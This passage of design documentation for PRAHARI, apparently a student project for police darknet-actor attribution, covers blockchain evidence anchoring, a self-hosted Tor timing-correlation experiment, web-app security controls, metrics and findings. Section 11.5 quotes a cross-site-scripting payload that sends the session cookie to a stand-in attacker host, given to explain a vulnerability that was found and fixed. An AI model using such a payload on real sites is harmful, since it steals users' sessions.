function anchor(bytes32 root, bytes32 caseRef, uint32 leafCount) external onlyAnchorer;

// reverts: ZeroRoot · ZeroLeaves · AlreadyAnchored(root) · NotAnchorer
// stores:  Seal { uint64 timestamp, uint32 leafCount, bytes32 caseRef, address anchorer }
// events:  Anchored(root, caseRef, leafCount, anchorer, timestamp)
// gas:     95,232 measured on Anvil
```

- **Only 32-byte hashes.** No handle, wallet address, name, listing text or analyst identity. A
  public blockchain is permanent and world-readable; putting investigative PII there would be a
  **far worse privacy failure than the one this system exists to investigate**. The contract
  stores a commitment; the evidence stays on the police network, and the chain proves only that
  it has not changed.
- **A root anchors exactly once.** Re-anchoring would let an operator overwrite the timestamp of
  an earlier seal — precisely the backdating the chain is here to prevent.
- **Sealing is restricted.** An open anchor function lets anyone spam roots and destroys the
  meaning of *"this case was sealed by the cyber cell at this time"*.

**The fallback is the part that matters ethically.** When the network is down the demo still
works — but it must be **impossible** to mistake a local-chain seal for a public one. A Sepolia
explorer link for an Anvil transaction would be a fabricated evidence trail, the exact opposite
of what this layer is for. So `is_public_chain` is derived from **the chain id the provider
actually connected to** — never from configuration or intent — and `explorer_url` returns `None`
on any non-public chain. D3.3 objective 5 attacks precisely this.

**Status:** the anchorer wallet `0x31EdD0021A09f0B32f7dfeb08B58622c75591991` needs one free Amoy
faucet claim, then `./scripts/deploy_amoy.sh` produces public explorer links. One claim covers
the deploy plus 100+ full demos.

---

## 10. Networking — live Tor timing

`engine/networking/timing.py` + `engine/networking/tor_testbed.py`

**Tor hides *which* IP you are, not *when* you send.** An adversary who can observe traffic
timing at the entry (near the client) and at the exit (near the service) can line up the two
streams and show they are the same conversation — **without decrypting anything**. That is the
technique that actually unmasks hidden services in the real world.

### The flow

| Step | What runs |
|---|---|
| 1 | A local HTTP backend that timestamps every request it receives — the **service** observation point |
| 2 | A tor process via `stem` with an **ephemeral** hidden service mapping `onion:80` → that backend |
| 3 | A client fetching the `.onion` through tor's SOCKS proxy on a deliberate timing pattern, timestamping each send — the **client** observation point |
| 4 | **Delay-invariant interval correlation** over the two timestamp streams |

Returns `CorrelationResult { confidence, peak_lag_ms, … }` — the peak lag is the circuit RTT.
Runtime ~30–40 s.

**Everything here is ours**: our backend, our hidden service, our client. Because both endpoints
are ours, observing the timing at each and correlating them is **legal and reproducible** — and
it is a genuine network-layer result, not a mock. In production the same maths runs where the
operator already controls a relay or has a lawful vantage point.

The correlation engine is **source-independent**: it takes two timestamp streams and reports how
strongly they correlate. `tor_testbed.py` produces real streams from a live local Tor circuit;
the maths does not care where they came from.

**Fallback:** if tor cannot bootstrap (no network, or tor absent), the experiment falls back to a
**controlled replay over the same real correlation engine**, clearly badged `simulated`. The
maths is identical; only the transport differs.

---

## 11. The web application

Next.js 14 App Router · TypeScript strict · NextAuth · Tailwind.

### 11.1 Routes

| Route | What it is |
|---|---|
| `/` | Landing — hero, intro, 3D globe |
| `/login` | NextAuth sign-in; demo analyst pre-filled locally, disabled in production unless `ENABLE_DEMO_ACCOUNT` is set |
| `/workbench` | Overview — navigator rail, context bar, two engine-sourced facts refreshed every 30 s and never from constants |
| `/workbench/actors` | Actor list, banded (Strong case / Worth a look / Weak-unresolved), searchable by handle, PGP, wallet or id |
| `/workbench/actor/[id]` | Actor profile — confidence, personas, clickable identifiers, infrastructure, provenance, PDF preview |
| `/workbench/actor/[id]/graph` | The graph intelligence lab |
| `/workbench/actor/[id]/evidence` | The evidence trail |
| `/workbench/actor/[id]/chain` | Wallet clustering to off-ramps |
| `/workbench/actor/[id]/timeline` | Activity timeline |
| `/workbench/compare` | Two actors side by side; **computes no score of its own** |
| `/workbench/tor` | The live timing experiment |
| `/workbench/case/[caseId]` | The tamper-evident ledger with its anchor link |
| `/workbench/classic` | The pre-v2.1 single-page cockpit, kept reachable |
| `/command` | The Command Panel |
| `/sangam` | SANGAM / SANGAM Pro |
| `/docs`, `/about` | In-app documentation and background |

API routes: `/api/engine/[...path]` (read proxy) · `/api/admin/[...path]` (admin proxy) ·
`/api/auth/[...nextauth]` · `/api/signup` · `/api/health` ·
`/api/stepup/{enrol,status,verify}`.

### 11.2 `lib/workspace.ts` — one source of truth

The single-page cockpit fetched the profile once and passed it down, which worked because there
was one page. The workspace splits that page into ten routes, and the obvious implementation —
each route fetching what it needs — would refetch on every tab change and, **worse, could render
two different confidences for one actor** if a refetch landed between them.

In a product whose entire claim is *"every published score reproduces from its trail exactly"*
(**INV-10**), a dossier showing 0.991 while the context bar shows something else is not a
rendering glitch; it is the product contradicting itself on screen.

So: one zustand store, one cache keyed by actor id. **Measured: two network calls per actor
across five route visits, and one confidence on every route.**

### 11.3 `lib/graphModel.ts` — one model, eleven renderers

The graph lab offers eleven representations of the same actor. They must all be views of **one**
model, not eleven builders that each walk the profile their own way — otherwise the matrix and
the force layout can disagree about whether an edge exists, and **the analyst has no way to tell
which is lying**.

- A hand-rolled **deterministic force solver**, because d3-force seeds from `Math.random` with no
  way to inject a generator — and an investigative graph that redraws differently each load is
  not evidence.
- Each of the ten 2D renderers exports a **caption stating what its layout means**.
- `ActorGraph3D` keeps its own private builder because it works and the prime directive says not
  to touch it; this model is a **superset** carrying the same nodes and edges plus the metadata
  the other ten views need.
- `NodeInspector` shows every edge with its signal root, strength and reliability exponent —
  and **what root-cause collapse discarded**.
- `lib/graphExport.ts` — PNG / SVG / JSON / GraphML, each stamped with actor, filter state, view,
  timestamp and engine version.

### 11.4 The Command Panel

Built security-first, on the rule that **a half-secured panel is worse than none**.

- **`lib/rbac.ts` (DEC-058)** — five roles as a strict hierarchy, each a superset of the one
  before, extending the existing `officer`/`analyst` model without changing either. The whole
  authorisation model reduces to a subset check, so a hierarchy with a hole in it is a
  vulnerability. Walked exhaustively by a **351-assertion generated matrix**.
- **`lib/totp.ts`** — RFC 6238 step-up, single-use codes, ±1 window drift, hashed single-use
  recovery codes, server-side token store. Destructive actions require a **fresh (120 s)**
  step-up.
- **`lib/sessions.ts`** — absolute 8-hour cap, a registry where an **unknown session is treated
  as revoked**, revoke-all on role change, session-bound CSRF.
- **`lib/passwords.ts`** — bcrypt cost 12 + pepper, legacy hashes still accepted, offline breach
  list.
- **`lib/adminGuard.ts` — THE control.** Order: IP allowlist → session → CSRF → role → step-up →
  rate limit. The middleware also guards `/command/*` and the UI hides what a role cannot do, but
  those are *a routing rule* and *a convenience*. `middleware.ts` runs on the Edge runtime and
  **cannot read the in-process step-up store**; the UI runs in a browser we do not control. If
  either were the only check, a hand-rolled `fetch` from the console would be enough to purge a
  retention policy.
- **A second, separate proxy** at `/api/admin/[...path]` — `/admin` never enters the read proxy's
  allowlist. The engine's `admin/` package then verifies a **request-bound signed token** and
  re-checks the role against **its own** table (DEC-060).
- **Mutations** — soft-delete only, optimistic concurrency, every mutation returns its diff and
  lands in the signed ledger. Dry-run-first bulk import; retention purge under a two-person rule.

### 11.5 `lib/report.ts` — FINDING-02

Reports are built as **DOM nodes**, never interpolated HTML strings. Both v1 print paths built
HTML by template-interpolating analyst-authored fields — case titles, assignees, notes — and
handed the result to `document.write()`. A case titled:

```html
<img src=x onerror="fetch('https://evil.test/'+document.cookie)">
```

executed on the same origin as the officer's session. **Verified reproducible before the
rewrite.** ESLint now bans `innerHTML`, `outerHTML`, `document.write` and
`dangerouslySetInnerHTML` at the linter layer too (**INV-6**), with the one legitimate exception
— the pre-paint skin picker — disabled at its own line with a written justification, so the
exception stays greppable rather than blanket-allowed.

`lib/reportPdf.ts` produces the one-page **vector** attribution report via jsPDF.

### 11.6 `lib/rateLimit.ts`

`/api/signup` and the credentials callback are the only routes reachable without a session,
which makes them the only places an attacker can brute-force a password or enumerate accounts.
v1 had no limit at all.

A fixed-window counter in module scope, deliberately — the playbook forbids Redis and a
single-node on-prem deployment does not need it. **The limitation is real and stated rather than
hidden:** behind multiple instances each process keeps its own window, so the effective limit
multiplies by instance count.

### 11.7 `lib/serviceStatus.ts` — the fourth state

Four states, and the distinction between the last two is the honest part: **"unknown" is never
rendered as "offline"**. A failed check is a fact about our knowledge, not about the service. A
free service that is merely asleep reads as **"waking"**, and a judge who read "offline" would
not click the link.

`lib/buildInfo.ts` reports version, SHA and environment from build-time env with Render and
Vercel fallbacks, and prints **"not reported"** where genuinely absent — deliberately not keyed
to `NODE_ENV`.

### 11.8 Generative UI

The app reskins itself on every load: one of six hand-tuned skins — **Ember, Abyss, Verdant,
Plasma, Solar, Arctic** (palette, type pair, shape, rail side) — resolved **synchronously before
first paint**, so it regenerates fresh each visit while every data feature stays identical.

- **Four-tier resolution:** `?skin=` → lock → session → fresh draw.
- The visit's draw is a versioned `{skin, layout, fontPair, drawnAt, v:2}` record in
  `sessionStorage`; an older or corrupt shape is **discarded and redrawn, never crashed on**.
- Every storage access is **individually guarded** with an in-memory singleton fallback, so a
  storage exception cannot break first paint.
- `ThemeControl` offers three distinct labelled behaviours — Reshuffle / Lock / Unlock — and
  captions which tier is in force. Unlock keeps the current draw.

**The bug underneath the bug (DEC-055).** Reskinning is fine for atmosphere. But some colour is
not decoration. Before the fix, every signal root on the evidence trail was drawn with
`linear-gradient(var(--accent-dim), var(--accent))` — all six roots in one colour, and that
colour skin-dependent. **Bar length was the only encoding**, and the one thing colour did carry
changed with the skin. That, not the palette re-roll, was the evidence-integrity problem.

### 11.9 Feature flags

Every v2.1 surface renders behind a flag defaulting **off**, so the legacy surface stays
reachable at all times. Prime directive: *additive only — nothing that works today may stop
working.*

| Flag | Turns on |
|---|---|
| `NEXT_PUBLIC_FF_WORKSPACE` | The routed analyst workspace |
| `NEXT_PUBLIC_FF_GRAPH_LAB` | The graph intelligence lab |
| `NEXT_PUBLIC_FF_COMMAND` | The Command Panel |
| `NEXT_PUBLIC_FF_SANGAM_PRO` | SANGAM Pro layers and the three-class model |

None is set in any committed env file, so a fresh clone gets the legacy surfaces until each is
switched on deliberately. A flag name is not a secret — but `ENGINE_URL`, API keys and private
keys stay server-only.

---

## 12. The engine API

| Router | Endpoints |
|---|---|
| **health** | `/health` · `/health/ping` · `/health/diagnostics` · `POST /health/warm` · `/version` |
| **actors** | `/actors` · `/actor/{id}` · `/actor/{id}/timeline` · `/export/actor/{id}.json` · `.csv` · `/export/actors.csv` |
| **graph** | `/stats` · `/actor/{id}` · `/persona/{id}` · `/search` · `/candidates` · `/metrics` · `POST /reload` |
| **fusion** | `/model` · `/example` · `/pair/{id}` · `/threshold` · `/thresholds` · `/metrics` · `POST /feedback` |
| **audit** | `/audit/cases` · `/audit/case/{id}/ledger` · `POST /audit/case/{id}/record` · `POST /audit/case/{id}/seal` · `/audit/case/{id}/proof/{index}` · `POST /audit/verify` · `/export/case/{id}.json` · `.csv` · `.pdf` |
| **infra** | `/pivot` · `/certificates` · `/host` · `/sources` |
| **geo (SANGAM)** | `/host` · `POST /hosts` · `/asn` · `/actor/{id}/footprint` · `/certificate-links` · `/sources` |
| **style** | `/style/compare` · `/style/profile/{id}` · `/behaviour/compare` · `/behaviour/profile/{id}` · `/compare` · `/rebrand/candidates` |
| **chainflow** | `/clusters` · `/trace` |
| **tor** | `POST /experiment` · `/status` · `POST /correlate` |
| **extract / feed / sources** | `POST /extract` · `/feed` · `/sources` |
| **admin** | `/{kind}` · `POST /{kind}` · `POST /{kind}/{rid}/restore` · `POST /bulk/import` · `POST /retention/purge` · `/analytics/{scope}` · `/audit/activity` |

The admin router authorises **independently** of the web proxy and is mounted **last** so it is
visibly separate.

**Global behaviour.** An unhandled exception handler returns
`{ok: false, error, path}` as JSON — *the workbench must never see an HTML error page from the
engine.* The engine caps `limit` at 200 (a `limit=500` returns 422), and a 422's `detail` is an
**array of objects**, which the client must render accordingly — rendering it naively threw React
#31 and blanked a route.

### Cold-start warming

The first request touching fusion or the ledger triggers Splink training and profile building —
about **20 seconds** on a cold process. A judge-simulation run caught this: the first click on
the Audit panel exceeded the proxy timeout and rendered as "engine offline" on a perfectly
healthy engine, because the development machine was always warm.

Warming now runs in a background thread at boot. The **actors index was originally missing from
that list** (DEC-066), found by `/health/diagnostics` reporting `actors_index: cold` on an engine
that had been up fifteen seconds and called itself warm — and `/actors` is the **first** call the
workbench, the actor list and SANGAM all make, so the whole product felt slow after every
spin-up while a local run felt instant.

```
measured after the fix
verdict: warm
caches : {'signals': True, 'actors_index': True}
first /actors            0.0107 s
first /fusion/metrics    0.0231 s
```

A companion test asserts that **reading the diagnostics does not itself warm anything** — a
diagnostic that warms what it measures can never report a cold cache.

---

## 13. The testbed and every measured number

### 13.1 The testbed — the only labelled dataset

`engine/testbed/generate.py`. Fixed seed **`20260920`**; the same seed produces a byte-identical
label digest. This is the only dataset in PRAHARI that carries labels, so **every** metric in
`docs/METRICS.md` comes from here — not from Agora (DEC-018).

| Property | Value |
|---|---|
| Personas | **244** |
| Posts | **2,928** |
| Labelled pairs | **3,340** |
| Positive (same actor) | **159** |
| Negative | 3,181 (20:1, capped) |
| must-not-link | 1 (the decoy) |
| Label digest | `3384a260be7e60c2…` |

Sized so calibration is possible at all: an earlier 40-actor configuration yielded only 21
positives, leaving ~10 in the validation split — **statistically useless** for a conformal
coverage guarantee at α = 0.05.

**The four injected cases.** Each is a claim the system must defend:

| Case | Solvable by | Purpose |
|---|---|---|
| **multi-persona** | Shared PGP or wallet (82% of pairs) | Proves linkage works |
| **rebrand** | Temporal + style + wallet **lineage** | Persona A goes dark, B appears days later with the same style and a wallet-lineage edge. Distinct addresses joined by a transfer, so **not** solvable by hard identifier alone |
| **infra leak** | onion v3 → certificate CN | Proves passive infrastructure pivoting |
| **decoy** | **must-not-link** | Verbatim copied bio, same style, overlapping window, **different PGP and wallet** — the false positive a defence lawyer would construct |

### 13.2 Identity graph

| Metric | Value |
|---|---|
| Splink precision @ 0.5 | **1.0000** |
| Splink recall @ 0.5 | 0.8176 |
| F1 @ 0.5 | 0.8997 |
| False positives | **0** |
| Blocking coverage | 0.8868 |
| Personas / entities / edges | 244 / 372 / 518 |
| Actors formed (WCC) | 140 |
| FastRP embeddings written | 244 |
| Multi-persona pairs → one actor | **130 / 130 (100%)** |
| Decoy → separate actor | **yes** |
| Rebrand → separate actor | **yes** (by design) |
| False merges over 3,180 unrelated pairs | **0** |
| Decoy `match_probability` | 0.0010 |

**Reading the 0.818 honestly.** The target was ≥ 0.90 and the **ceiling is structural, not a
tuning failure**: of 159 true pairs only **130 share any hard identifier**, and Splink finds
**130 of 130**.

| Framing | Value |
|---|---|
| Recall over pairs sharing a hard identifier | **1.000** |
| Recall over all true pairs | 0.818 (ceiling 0.818) |
| Precision | 1.000 |

The 29 unreachable pairs share no PGP, no wallet and no email. They are exactly what stylometry,
behaviour and fusion exist to catch — an actor who rotated every hard identifier but kept their
writing habits. The rebrand case is deliberately one of them. *Raising the generator's
identifier-sharing rate would push this past 0.9 while making the task strictly easier.*

**Measured m/u probabilities**, from ground truth with Laplace smoothing, **not** estimated.
`estimate_u_using_random_sampling` reported u(pgp) = 0.0053 because it sampled the true matches
too; the measured value is 0.

| Comparison | m = P(agree \| match) | u = P(agree \| non-match) | Bayes factor |
|---|---|---|---|
| PGP fingerprint | 0.6531 | 1.70e−05 | **38,519** |
| Wallet | 0.4531 | 1.70e−05 | **26,724** |
| Email | 0.0031 | 5.09e−05 | 61 |

### 13.3 Stylometry and behaviour

| Metric | Value |
|---|---|
| Mean `s_style`, true pairs | **0.5942** |
| Mean `s_style`, unrelated pairs | 0.5314 |
| **Separation** | **+0.0628** (> 0 required) |
| Decoy raw char-n-gram similarity | **0.8272** — it genuinely reads like its target |
| **Decoy `s_style`** | **0.2000** (capped) |
| Rebrand `s_style` | 0.8432 |
| **Decoy < rebrand** | **yes** — the Phase 5 inversion |
| `mimicry_suspected` fires on decoy | **yes** |
| Rebrand case detected | **yes**, rank 1 of 1, correct dates, gap 5 d |
| Model used | **logistic** (Siamese cut, DEC-023) |

**Authorship verifier:** ROC AUC **0.7976**, accuracy 0.7068, 445 train / 191 test pairs.

| Feature | Learned weight |
|---|---|
| `char_ngram` | **+3.4000** |
| `hinglish_diff` | **−3.0039** |
| `punct_cosine` | +1.7887 |
| `honorific_diff` | −0.4257 |
| `ttr_diff` | −0.3281 |

The Hinglish ratio is the **second-strongest feature in the model** — direct evidence the
Hinglish markers earn their place rather than being decoration for an Indian-jurisdiction pitch.

**LLM-rewrite detector (DEC-024).** Burstiness across 244 personas: min 0.102, median 0.205,
max 0.385.

| | Absolute threshold | Relative (5th percentile) |
|---|---|---|
| False positives on genuine personas | 206 / 244 (**84%**) | **11 / 244 (4.5%)** |
| Catches genuinely flattened text | — | **yes** (burstiness 0.000) |
| With no reference corpus | fired anyway | **abstains** |

### 13.4 Fusion and calibration

Fixed seed 42, 3,340 pairs, 2,004 train / 1,336 validation.

| Metric | Value |
|---|---|
| Precision @ τ(α=0.05) | **1.0000** |
| Recall @ τ(α=0.05) | 0.8833 |
| F1 @ τ(α=0.05) | **0.9381** |
| **False-merge rate @ τ** | **0.031348 ≤ α = 0.05** ✔ |
| Brier score | **0.005333** |
| ECE (10 bins) | **0.005083** |
| Accepted links @ τ | 93 |
| **Decoy `p_raw`** | **0.000803** (cap 0.30, `mimicry_suspected` listed) |
| **Rebrand `p_raw`** | **0.2335** — no `identity_key` root at all |

**The conformal guarantee across risk budgets:**

| α | τ | measured FMR | holds | accepted links |
|---|---|---|---|---|
| 0.01 | 1.000000 | 0.0000 | **yes** | 52 |
| 0.02 | 1.000000 | 0.0000 | **yes** | 52 |
| 0.05 | 0.029851 | 0.031348 | **yes** | 93 |
| 0.10 | 0.029851 | 0.031348 | **yes** | 93 |
| 0.20 | 0.029851 | 0.031348 | **yes** | 93 |

Lower α gives a higher τ and fewer accepted links, and the bound holds at every α.

**Stated limitation (DEC-029):** isotonic collapses these scores into few distinct steps, so τ
has coarse resolution — α = 0.05 and α = 0.10 currently share a τ, and α = 0.01 is only
honourable by accepting the 52 pairs scored at 1.0. That is a limit of 1,336 validation pairs,
not a bug, and **the UI slider must not imply finer control than the data supports**.

### 13.5 Extraction

Fail thresholds: location recall ≥ 0.85 English, ≥ 0.70 Hinglish. Measured on 30 hand-labelled
sentences **after gazetteer normalisation** — that is what the consumer actually receives, and an
extraction the gazetteer cannot resolve is a dropped result, not a success.

| Entity type | Language | P | R | F1 |
|---|---|---|---|---|
| Location | English (15 sentences) | 1.000 | 1.000 | 1.000 |
| Location | Hinglish (15 sentences) | 1.000 | 1.000 | 1.000 |
| Wallet (BTC/ETH/XMR) | — | 1.000 | 1.000 | 1.000 |
| Onion v3 | — | 1.000 | 1.000 | 1.000 |
| PGP fingerprint | — | 1.000 | 1.000 | 1.000 |
| Handle / email / telegram | — | 1.000 | 1.000 | 1.000 |

**Read this before quoting the 1.000.** The labelled sentences and the alias table were authored
together, so these are a **regression guard, not a generalisation estimate**. An independent
probe of surface forms deliberately absent from the alias table scores **7/10** — all three
misses are unseen misspellings (`jabalpurr`, `jabalpr`, `JBL`), and **zero are false positives**.
That asymmetry is a deliberate design choice, explained in §5.

### 13.6 Performance

| Metric | Target | Actual |
|---|---|---|
| `anchor()` gas (Anvil) | ≈ 70k | **95,232** |
| First `/actors` after warm | — | 0.0107 s |
| First `/fusion/metrics` after warm | — | 0.0231 s |
| Network calls per actor across 5 routes | — | **2** |

---

## 14. Testing, CI and invariants

### Counts

| Suite | Count |
|---|---|
| Engine (pytest) | **493** |
| Web (vitest) | **991** |
| Routes clean under axe-core, WCAG 2.1 AA serious + critical | **17 / 17** |
| E2E journey checks (`journey.mjs`) | **147** |
| Solidity (`forge test`) | 12 written — **not run here**, `forge` not installed |

Stated rather than implied. The e2e journey **detects the feature-flag state and runs in both
builds**, because a flag-on-only gate cannot catch a flag-off regression — which is exactly the
bug it found.

### CI — `.github/workflows/ci.yml`

Two jobs: `web` (npm ci → vitest → production build) and `engine` (pytest + migrations against a
`pgvector/pgvector:pg16` service container). Triggered on push to `main` and `phase/**`, and on
PRs to `main`, with in-progress runs cancelled per ref.

### The invariants

| ID | Invariant |
|---|---|
| **INV-1** | No outbound request ever reaches a `.onion`. Enforced at the resolver *and* the infra engine, tested at the network layer |
| **INV-2** | `ENGINE_URL` never gains a `NEXT_PUBLIC_` prefix and has exactly the expected readers |
| **INV-3** | `extract()` never raises |
| **INV-4** | `fetch_all()` never raises and always returns a usable payload |
| **INV-6** | No `innerHTML`, `outerHTML`, `document.write` or `dangerouslySetInnerHTML` — asserted statically *and* by ESLint |
| **INV-10** | Every published score reproduces from its trail exactly |
| **INV-11** | Shape and label always carry the same information as colour |
| **INV-12** | SANGAM stays free and keyless |

---

## 15. Running and deploying

### Local — no keys, no Docker

```bash
# engine — Python 3.12 via uv
cd engine && uv sync && uv run uvicorn engine.main:app --port 8000

# web
cd web && npm install && npm run dev

# or one-shot
./scripts/demo.sh
```

Open <http://localhost:3000> → **Open workbench** → sign in with `analyst@prahari.local` /
`prahari123`. The demo account is disabled entirely in production.

### Commands

| Command | Does |
|---|---|
| `npm run dev` / `npm run engine` | Next on :3000 / uvicorn on :8000 |
| `npm test` / `npm run engine:test` | vitest / pytest |
| `npm run test:all` | vitest + pytest + `forge test` |
| `npm run e2e` | `node web/e2e/journey.mjs` |
| `npm run db:up` / `db:down` / `db:reset` | docker compose — Neo4j (+GDS), Postgres (+pgvector) |
| `npm run migrate` | `alembic upgrade head` |
| `npm run warmup` | Wake and warm the deployed services |
| `uv run python -m engine.fusion.eval` | Regenerate every metric |
| `node scripts/gen_docs.cjs` | Build the four-PDF document pack |

### Deploy

Frontend on **Vercel**, engine on **Render**, contract on **Polygon Amoy** — all free. Already
wired: `engine/Dockerfile` (installs **Tor** for the live timing demo), `render.yaml`,
`web/vercel.json`, `.dockerignore`, and two `.env.production.example` files.

`NEXTAUTH_URL` is taken from Render's own `RENDER_EXTERNAL_URL` at start, so there is no manual
URL step. First build takes 5–10 minutes (scipy, scikit-learn, spaCy, Tor). The engine is heavy
for a 512 MB free instance but boots fine; the core workbench, fusion, ledger, SANGAM and Tor
demo run within free limits.

**Ship to three branches:** `feat/v2.1-workspace`, `v2-rebuild` (what Render builds) and `main`
(which carries the keep-alive cron). **A 404 on a health path means the deployed build predates
the change** — the branch has not been pushed and redeployed.

### Free-tier uptime — the arithmetic

Verified against Render's live documentation on 2026-09-03:

| Fact | Value |
|---|---|
| Free instance hours | **750 per calendar month** |
| Scope | **Per workspace, shared** — not per service |
| Spin-down | 15 minutes without inbound traffic |
| Cold start | ~1 minute |
| Hours consumed | Only while running |

```
750 h/month ÷ 3 services                = 250 h per service per month
250 h ÷ 30.44 days                      = 8.21 h per service per day
with the 85% guard: 637.5 ÷ 3 ÷ 30.44   = 6.98 h per service per day

three services awake 24/7 would need 3 × 24 × 30.44 ≈ 2,192 hours
the pool is 750
```

**No schedule keeps these services up 24/7 on the free tier.** Stated rather than worked around.

**Why the cron is not `*/5`.** It was, and it did not work. Measured over 2026-09-03/04 the
schedule asked for ~120 runs a day and GitHub delivered **four in two days**. GitHub documents
`schedule` as best-effort and drops high-frequency crons under load — and against a 15-minute
idle timer, a ping every four to nine hours keeps nothing awake. So the trigger is no longer the
thing that has to be frequent: **one run holds a single job for a 5.5-hour segment**, ticking
every five minutes from inside it, then dispatching its own successor via `workflow_dispatch`.
The chain needs the scheduler to work **once**, not 120 times a day.

---

## 16. The findings ledger

Recorded because **how** each was found is the point: most were caught by running the thing, not
by reading it.

| Finding | What it was | Found by |
|---|---|---|
| **FINDING-02** | v1 print paths interpolated analyst-authored fields into HTML and called `document.write()`. A case title containing an `<img onerror>` executed on the officer's origin | Phase 1 audit; verified reproducible before the rewrite |
| **FINDING-06** | `geoderive.ts` emitted a Binance off-ramp for **every** actor, stamped `inferred: false` — a fabricated cash-out claim rendered as a measurement | An hour-old test suite; pinned as a failing test until Phase 5 fixed it |
| **FINDING-07** | Groq returned `"jbp"`, the gazetteer could not resolve it, and the city was silently dropped. Neither extraction path was correct | Verifying the Groq path in Phase 1 |
| **FINDING-08** | `users/../retention/purge` authorised as `users` — privilege escalation by path traversal | The 351-assertion generated matrix |
| **FINDING-09** | `routers/geo.py` handed **any** host to `socket.gethostbyname()`, including `.onion`. Proven with a spy *before* fixing: the query really was issued | Phase 5 security pass; the pre-existing spy test patched a different function |
| — | A bare `rewrites()` array is `afterFiles`, so **the flag-off build served the new Overview anyway** | Walking the routes in a browser |
| — | The step-up's injected clock never reached the crypto, so a two-window-old TOTP code verified | Phase 4 tests |
| — | `Secure` cookie flag keyed to `NODE_ENV` broke login entirely on any production build over HTTP | Phase 4 |
| — | The keep-alive guard failed **open**: a corrupt budget artifact was indistinguishable from a missing one | Running it |
| — | `date +%s%3N` is GNU-only; BSD `date` *succeeds* with a literal `3N`, so every macOS timing was garbage | Running it on macOS |
| — | The 2D graph settled into a thumbnail in the middle of the stage | Screenshotting the page |
| — | `/workbench/classic` and `/command` had **no footer** — the root instance stands down for those prefixes | Walking every route |
| — | `createDocument` under happy-dom returns an **HTML** document, so `setAttribute("xmlns")` emitted malformed XML | Running the export tests |
| — | `limit=500` → 422; a 422's `detail` is an array of objects, and rendering it threw React #31 and blanked the route | Walking the routes |
| — | The startup warm list omitted the **actors index**, so every cold start rebuilt it on the first `/actors` call | `/health/diagnostics` |

---

## 17. What is not built

A system that publishes its limits is one you can check. That is the point of the whole design.

### Deliberate non-goals

- It does **not** break Tor. Every source is a public index that already holds the data.
- It does **not** scrape live marketplaces or probe target hosts.
- Behavioural analysis runs on **labelled synthetic ground truth**, because the public archive we
  ingest carries no reliable timestamps.
- **Stylometry is the weakest signal** and is weighted at about half a signing key, deliberately.

### Declared but unimplemented

| Area | Status |
|---|---|
| Command Panel user CRUD | **Read-only.** Invite / disable / reset-TOTP / revoke-sessions are declared in the authorisation table but have no handlers, so **last-admin protection and self-role-change refusal are not implemented** — and their tests are **absent rather than vacuously passing** |
| Persona merge / split | **Not built.** Their ledger actions are reserved |
| SANGAM layers | **4 of 10.** Certificate reuse, persona overlay, ASN clustering and jurisdiction render their toggles but draw nothing; the temporal scrubber, movement trails and density heat map are absent entirely |
| `/geo/asn` | Returns a **null ASN** — Cymru's interface is DNS TXT and `dnspython` is not a dependency. The ASN shown in the UI comes from `ipwho.is` |
| **UNAVAILABLE** in a footprint | Not reachable — **no actor in this dataset carries a `.onion`**. Demonstrated through the host-lookup box instead |
| Solidity tests | 12 exist; `forge` is not installed in this environment |
| On-chain anchor | Needs one free Amoy faucet claim to the anchorer wallet |
| Uptime gate | **Conditional** — needs a month of real running and the account owner's Render usage page |
| Scheduled reports | Deferred |

---

## 18. Glossary

| Term | Meaning |
|---|---|
| **Actor** | The person or group under investigation |
| **Persona** | One handle on one marketplace. Attribution decides which personas are one actor |
| **Signal** | One piece of evidence, tagged with the **root** explaining *why* it agrees |
| **Root** | The underlying cause of an agreement — one of six. Grouping by root is what stops double-counting |
| **Root-cause collapse** | Keeping only the strongest signal per root before combining |
| **Reliability exponent `r`** | How much a *class* of evidence has earned, applied as `LR^r` |
| **LR** | Likelihood ratio, `s / (1 − s)` |
| **Naive noisy-OR** | The baseline PRAHARI beats: `1 − Π(1 − sᵢ)` |
| **Cap / must-not-link** | A competing explanation that clamps the score rather than reducing it |
| **Blocking** | Candidate generation. A recall ceiling: an unblocked pair can never be scored |
| **m / u** | P(fields agree \| match) and P(fields agree \| non-match). Their ratio is the Bayes factor |
| **Calibration / ECE** | Whether "0.84" really means 84% |
| **Conformal / τ / α** | The distribution-free guarantee: at threshold τ, at most α of accepted links are wrong |
| **False-merge rate** | `1 − precision` at τ — the number that matters in court |
| **Decoy** | The injected must-not-link case: copied bio, different hard identifiers |
| **Rebrand** | The injected case where an actor rotates identifiers but keeps style and wallet lineage |
| **SANGAM** | संगम, "confluence" — the map surface answering *where* |
| **RESOLVED / DERIVED / UNAVAILABLE** | The three coordinate classes |
| **Ledger / seal / anchor** | The signed hash chain, its Merkle root, and that root recorded on chain |
| **Inclusion proof** | A short proof that one record was in a sealed case, disclosing nothing else |

---

*PRAHARI · प्रहरी · SIH 2026 · PS 26151 (NTRO) · Team Vasiliades · free and open source, on-premise, ₹0 to run.*

*Sources: `README.md` · `PROGRESS.md` · `docs/{ARCHITECTURE, METRICS, DECISIONS, UPGRADE_V2.1, UPTIME, TESTLOG, DEMO}.md` · `engine/` · `web/` · `anchor/`*
